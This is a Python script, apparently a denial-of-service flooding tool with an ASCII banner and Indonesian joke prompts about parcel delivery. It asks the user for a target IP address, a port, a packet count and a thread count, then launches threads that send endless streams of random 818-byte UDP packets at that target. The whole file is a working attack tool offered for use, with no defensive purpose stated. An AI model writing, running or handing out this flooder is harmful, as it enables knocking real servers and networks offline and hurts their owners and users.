import random
import socket
import threading
import os,sys
import time

os.system("clear")
time.sleep(2)
print('''\033[1;31;40m
░██████╗██╗░░██╗░█████╗░██████╗░███████╗
██╔════╝██║░░██║██╔══██╗██╔══██╗██╔════╝
╚█████╗░███████║██║░░██║██████╔╝█████╗░░
░╚═══██╗██╔══██║██║░░██║██╔═══╝░██╔══╝░░
██████╔╝██║░░██║╚█████╔╝██║░░░░░███████╗
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚══════╝

░█████╗░███████╗██████╗░░█████╗░████████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
██║░░╚═╝█████╗░░██████╔╝███████║░░░██║░░░
██║░░██╗██╔══╝░░██╔═══╝░██╔══██║░░░██║░░░
╚█████╔╝███████╗██║░░░░░██║░░██║░░░██║░░░
░╚════╝░╚══════╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
''')
print("\033[94m")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GAS ATTACK(y/n):"))
times = int(input("PAKET SHOPE JORDAN:"))
threads = int(input(" ONGKOS KURIR:"))

os.system("clear")
def run():
  data = random._urandom(818)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" PAKET SHOPE JORDAN OTW!!!!")
    except:
      print("[X] TOK TOK PAKET COD!!!")

def run2():
  data = random._urandom(818)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" PAKET SHOPE JORDAN OTW!!!!")
    except:
      s.close()
      print("[X] TOK TOK PAKET COD!!!")

def run3():
  data = random._urandom(818)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" PAKET SHOPE JORDAN OTW!!!!")
    except:
      s.close()
      print("[X] TOK TOK PAKET COD!!!")

def run4():
  data = random._urandom(818)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" PAKET SHOPE JORDAN OTW!!!!")
    except:
      s.close()
      print("[X] TOK TOK PAKET COD!!!")

def run5():
  data = random._urandom(818)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" PAKET SHOPE JORDAN OTW!!!!")
    except:
      s.close()
      print("[X] TOK TOK PAKET COD!!!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
    th = threading.Thread(target = run2)
    th.start()
    th = threading.Thread(target = run3)
    th.start()
else:
    th = threading.Thread(target = run4)
    th.start()
    th = threading.Thread(target = run5)
    th.start()